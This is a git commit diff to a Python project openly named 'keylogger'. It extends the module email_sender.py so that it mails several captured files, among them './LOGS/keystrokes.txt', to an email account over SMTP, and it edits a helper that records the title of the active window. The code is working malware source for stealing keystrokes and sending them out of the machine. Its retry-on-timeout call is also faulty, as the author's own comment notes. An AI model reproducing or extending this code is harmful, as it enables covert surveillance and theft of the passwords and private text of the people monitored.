abb096479081817b60995e0d00c9d8ae13904d71
imdtarikgrbz <imdattarikgurbuz@gmail.com>
2025-06-27 00:24:56 +0300

    The email_sender.py module has been improved with support for multi-file attachments.

--- keylogger/email_sender.py
+++ keylogger/email_sender.py
@@ -4,6 +4,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+from config import DEBUG
 
 class Email:
     def __init__(self) -> None:
@@ -12,9 +13,15 @@ class Email:
         self.USERNAME = psw.email  # Your email login
         self.PASSWORD = psw.psw  # Your email password
         
-    def send_email(self,sender_email,receiver_email:str,subject:str,body:str,attachment=None) -> None:
+    def send_email(self,*args:str,sender_email:str,receiver_email:str,subject:str,body:str) -> None:
+        self.sender_email = sender_email
+        self.receiver_email = receiver_email
+        self.subject = subject
+        self.body = body
+        self.args = args
+        
         message = MIMEMultipart()
-        message["From"] = psw.email
+        message["From"] = sender_email
         message["To"] = receiver_email
         message["Subject"] = subject
         
@@ -22,22 +29,29 @@ class Email:
         message.attach(MIMEText(body, "plain"))
         
         # Attach file
-        with open(attachment, "rb") as attachment:
-            part = MIMEBase("application", "octet-stream")
-            part.set_payload(attachment.read())
+        if args:
+            for file in args:
+                with open(file, "rb") as file:
+                    part = MIMEBase("application", "octet-stream")
+                    part.set_payload(file.read())
 
-        encoders.encode_base64(part)  # Encode to base64
-        part.add_header("Content-Disposition", f"attachment; filename={attachment}")  # Manually set file name
-        message.attach(part)  # Attach the file to the email
+                encoders.encode_base64(part)  # Encode to base64
+                part.add_header("Content-Disposition", f"attachment; filename={file}")  # Manually set file name
+                message.attach(part)  # Attach the file to the email
 
         context = ssl.create_default_context()
         # Send email
-        with smtplib.SMTP(self.SMTP_SERVER, self.SMTP_PORT) as server:
-            server.ehlo()  # Can be omitted
-            server.starttls(context=context)
-            server.ehlo()  # Can be omitted
-            server.login(self.USERNAME, self.PASSWORD)
-            server.sendmail(sender_email, receiver_email, message.as_string())
+        try:
+            with smtplib.SMTP(self.SMTP_SERVER, self.SMTP_PORT) as server:
+                server.ehlo()  # Can be omitted
+                server.starttls(context=context)
+                server.ehlo()  # Can be omitted
+                server.login(self.USERNAME, self.PASSWORD)
+                server.sendmail(sender_email, receiver_email, message.as_string())
+        except TimeoutError:
+            if DEBUG:
+                print("Timeout Error raised")
+            self.send_email(self.args,self.sender_email,self.receiver_email,self.subject,self.body) #! Must be looked
 
 
 
@@ -45,8 +59,11 @@ class Email:
 
 if __name__ == "__main__":
     app = Email()
-    app.send_email(receiver_email = psw.email,
-                    sender_email= psw.email,
-                    subject = "Email with Attachment",
-                    body = "Hello, please find the attached file.",
-                    attachment="./LOGS/logs.log")
+    app.send_email(
+        "./LOGS/logs.log",
+        "./LOGS/keystrokes.txt",
+        receiver_email=psw.email,
+        sender_email=psw.email,
+        subject="Email with Attachment",
+        body="Hello, please find the attached file."
+    )
--- keylogger/utils.py
+++ keylogger/utils.py
@@ -2,4 +2,3 @@ from win32gui import GetWindowText,GetForegroundWindow
 
 def get_window_title() ->str :
     return GetWindowText(GetForegroundWindow()) # Get the title of the currently active window
-    
